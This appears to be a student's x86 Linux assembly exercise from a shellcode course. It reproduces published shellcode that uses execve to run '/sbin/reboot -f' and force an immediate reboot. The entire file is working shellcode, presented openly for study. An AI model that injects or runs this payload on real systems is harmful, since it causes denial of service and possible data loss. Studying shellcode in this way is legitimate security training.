; Student:   SLAE-755
; Original reboot shellcode
; shell-storm.org/shellcode/files/shellcode-831.php

global _start			

section .text

_start:
	xor	 eax,eax
	push	 eax

	;toober/nibs/
	push	dword 0x746f6f62
	push	dword 0x65722f6e
	push	dword 0x6962732f
	mov	ebx,esp
	push	eax

	;-f Force immediate halt
	push	word 0x662d
	mov	esi,esp
	push	eax
	push	esi
	push	ebx
	mov	ecx,esp

	;#define __NR_execve 11 syscall
	mov	 al,0xb
	int	 0x80
